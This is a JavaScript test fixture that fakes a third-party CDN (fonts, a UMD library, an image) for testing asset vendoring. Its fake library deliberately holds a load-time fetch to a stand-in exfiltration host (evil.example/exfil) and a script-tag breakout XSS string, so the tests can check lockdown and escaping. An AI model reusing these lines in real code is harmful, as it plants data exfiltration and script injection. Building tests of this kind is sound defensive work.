// SPDX-License-Identifier: AGPL-3.0-or-later
// A fake third-party network for vendoring tests (ADR-022): a DNS that answers a public address for every host and
// a transport that serves canned CDN responses (Google Fonts CSS, a real WOFF2 font, a jsDelivr redirect to a UMD
// library, an image). Plugged in as `vendorNetwork`, so the REAL fetcher still runs every SSRF, size and content
// check. Nothing here touches the network.
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const fontFile = fileURLToPath(
  new URL(
    "../../../packages/ui/fonts/jetbrains-mono/jetbrains-mono-latin-wght.woff2",
    import.meta.url,
  ),
);

/** A tiny valid PNG (1×1). */
export const PNG = Buffer.from(
  "89504e470d0a1a0a0000000d4948445200000001000000010806000000" +
    "1f15c4890000000d4944415478da63f8cfc0f01f0005000201a5f0e0cb0000000049454e44ae426082",
  "hex",
);

export const URLS = {
  css2: "https://fonts.googleapis.com/css2?family=Vendored+Mono:wght@400&display=swap",
  font: "https://fonts.gstatic.com/s/vendoredmono/v1/latin.woff2",
  libRange: "https://cdn.jsdelivr.net/npm/mini-chart@1/dist/mini-chart.umd.js",
  libPinned: "https://cdn.jsdelivr.net/npm/mini-chart@1.2.3/dist/mini-chart.umd.js",
  image: "https://images.example.org/photo.png",
};

/**
 * The UMD library: a global `MiniChart`, a string with a closing script tag (the builder must escape it), and an
 * attempt to reach the network at load time, which the lockdown must neutralize (it records what it saw).
 */
export const LIB_SOURCE = `(function (root) {
  var probe = { fetch: typeof root.fetch, xhr: typeof root.XMLHttpRequest, ws: typeof root.WebSocket };
  try { root.fetch("https://evil.example/exfil"); probe.fetched = true; } catch (e) { probe.fetched = false; }
  root.MiniChart = {
    probe: probe,
    marker: "</script><script>alert(1)</script>",
    render: function (el, n) { el.textContent = "bars:" + n; el.setAttribute("data-rendered", String(n)); }
  };
})(this);`;

export const CSS2_BODY = `/* latin */
@font-face {
  font-family: 'Vendored Mono';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(${URLS.font}) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+2000-206F;
}
`;

/** `{ resolve, transport }` for `createServer({ vendorNetwork })`, plus the list of requests it served. */
export function fakeCdn(extra = {}) {
  const font = readFileSync(fontFile);
  const routes = {
    [URLS.css2]: { body: Buffer.from(CSS2_BODY), type: "text/css" },
    [URLS.font]: { body: font, type: "font/woff2" },
    [URLS.libRange]: { status: 302, location: URLS.libPinned },
    [URLS.libPinned]: { body: Buffer.from(LIB_SOURCE), type: "application/javascript" },
    [URLS.image]: { body: PNG, type: "image/png" },
    ...extra,
  };
  const requests = [];
  return {
    requests,
    resolve: async () => [{ address: "93.184.216.34", family: 4 }],
    transport: async ({ url }) => {
      requests.push(url.href);
      const r = routes[url.href];
      const body = r?.body;
      return {
        status: r === undefined ? 404 : (r.status ?? 200),
        headers: {
          ...(r?.location ? { location: r.location } : {}),
          ...(r?.type ? { "content-type": r.type } : {}),
        },
        body: (async function* () {
          if (body !== undefined) yield new Uint8Array(body);
        })(),
        abort() {},
      };
    },
  };
}

/** An artifact that uses every vendored kind plus an interactive widget (one button, one output). */
export const ARTIFACT = `<!doctype html>
<html lang="en">
<head>
  <title>Vendored deck</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="${URLS.css2}" rel="stylesheet">
  <script src="${URLS.libRange}"></script>
  <style>
    body { font-family: 'Vendored Mono', monospace; background: #101418; color: #f2efe9; }
    .slide { display: none; padding: 5vw; }
    .slide.active { display: block; }
    h1 { font-size: 6vw; }
    .shot { width: 20vw; }
  </style>
</head>
<body>
  <div class="slide active"><h1 id="title">Vendored fonts</h1><img class="shot" src="${URLS.image}" alt="photo"></div>
  <div class="slide"><h2>Widget</h2><button id="go" onclick="draw()">Draw</button><output id="out">idle</output></div>
  <script>
    var clicks = 0;
    function draw() { clicks += 1; MiniChart.render(document.getElementById("out"), clicks); }
    document.body.setAttribute("data-deck-script", "ran");
  </script>
</body>
</html>`;
